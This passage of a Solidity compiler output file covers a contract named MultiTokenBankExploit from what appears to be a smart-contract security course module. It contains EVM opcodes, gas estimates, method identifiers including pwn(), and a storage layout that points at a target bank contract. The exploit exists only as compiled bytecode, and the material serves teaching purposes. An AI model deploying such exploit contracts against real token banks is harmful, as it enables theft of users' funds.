POP JUMP JUMPDEST PUSH0 PUSH2 0x5B8 DUP4 DUP4 PUSH2 0x59E JUMP JUMPDEST PUSH1 0x20 DUP4 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5DA DUP3 PUSH2 0x575 JUMP JUMPDEST PUSH2 0x5E4 DUP2 DUP6 PUSH2 0x57F JUMP JUMPDEST SWAP4 POP PUSH2 0x5EF DUP4 PUSH2 0x58F JUMP JUMPDEST DUP1 PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x61F JUMPI DUP2 MLOAD PUSH2 0x606 DUP9 DUP3 PUSH2 0x5AD JUMP JUMPDEST SWAP8 POP PUSH2 0x611 DUP4 PUSH2 0x5C4 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x5F2 JUMP JUMPDEST POP DUP6 SWAP4 POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x667 DUP2 PUSH2 0x655 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH2 0x678 DUP4 DUP4 PUSH2 0x65E JUMP JUMPDEST PUSH1 0x20 DUP4 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x69A DUP3 PUSH2 0x62C JUMP JUMPDEST PUSH2 0x6A4 DUP2 DUP6 PUSH2 0x636 JUMP JUMPDEST SWAP4 POP PUSH2 0x6AF DUP4 PUSH2 0x646 JUMP JUMPDEST DUP1 PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x6DF JUMPI DUP2 MLOAD PUSH2 0x6C6 DUP9 DUP3 PUSH2 0x66D JUMP JUMPDEST SWAP8 POP PUSH2 0x6D1 DUP4 PUSH2 0x684 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x6B2 JUMP JUMPDEST POP DUP6 SWAP4 POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x704 DUP2 DUP6 PUSH2 0x5D0 JUMP JUMPDEST SWAP1 POP DUP2 DUP2 SUB PUSH1 0x20 DUP4 ADD MSTORE PUSH2 0x718 DUP2 DUP5 PUSH2 0x690 JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x744 PUSH2 0x73F PUSH2 0x73A DUP5 PUSH2 0x721 JUMP JUMPDEST PUSH2 0x46E JUMP JUMPDEST PUSH2 0x655 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x754 DUP2 PUSH2 0x72A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x76D PUSH0 DUP4 ADD DUP6 PUSH2 0x4F3 JUMP JUMPDEST PUSH2 0x77A PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x74B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x4E9651408F80CD4FC7A7F7D939E99E03 0xB5 SLT CREATE2 DUP8 DUP11 0xE2 PUSH17 0x55B63285A6C492E664736F6C6343000816 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "395000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"ETH()": "373",
						"bank()": "infinite",
						"pwn()": "infinite"
					}
				},
				"methodIdentifiers": {
					"ETH()": "8322fff2",
					"bank()": "76cdb03b",
					"pwn()": "dd365b8b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 40,
						"contract": "Modules/Security/7. Multi Token Bank.sol:MultiTokenBankExploit",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IMultiTokenBank)34"
					}
				],
				"types": {
					"t_contract(IMultiTokenBank)34": {
						"encoding": "inplace",
						"label": "contract IMultiTokenBank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}